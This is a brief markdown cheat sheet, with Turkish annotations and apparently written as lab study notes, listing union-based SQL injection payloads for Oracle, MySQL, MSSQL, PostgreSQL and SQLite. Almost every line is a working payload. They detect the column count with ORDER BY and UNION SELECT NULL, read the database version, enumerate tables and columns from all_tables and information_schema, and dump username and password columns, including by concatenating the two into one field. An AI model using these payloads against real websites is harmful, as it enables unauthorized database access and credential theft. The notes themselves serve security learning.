# Union-Based SQL Injection

### Tanım
- SELECT * FROM products WHERE category = 'Gifts' ...

- ==> +UNION+SELECT+NULL,NULL,NULL-- ==> ' order by 3-- --> ok

-------------------------------------

### UNION (Oracle)
- ' ORDER BY 1--
- ' UNION SELECT 'abc', 'def' FROM dual-- ==> ' order by 2-- --> ok
- ' UNION SELECT BANNER, NULL FROM v$version-- ==> versiyon öğrenme
- '+UNION+SELECT+table_name,NULL+FROM+all_tables-- 
    - ==> USERS_ABCDEF
- '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'-- 
    - ==> USERNAME_ABCDEF PASSWORD_ABCDEF
- '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--

### UNION (MySQL, MSSQL (Microsoft SQL Server), PostgreSQL, SQLite)
- ' ORDER BY 1--
- ==> ' UNION SELECT 'abc', 'def'#
- ==> ' UNION SELECT @@version, NULL#
- ==> '+UNION+SELECT+'abc','def'--
- ==> '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
- ==> '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
- ==> '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--

-------------------------------------

- ==> ' UNION SELECT table_name, NULL FROM all_tables--
- ==> '+UNION+SELECT+NULL,NULL,NULL--
- ==> '+UNION+SELECT+'abc','def'--
- ==> ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS'--
- ==> ' UNION SELECT username, password FROM users--
- ==> ' UNION SELECT NULL, username || '~' || password FROM users--
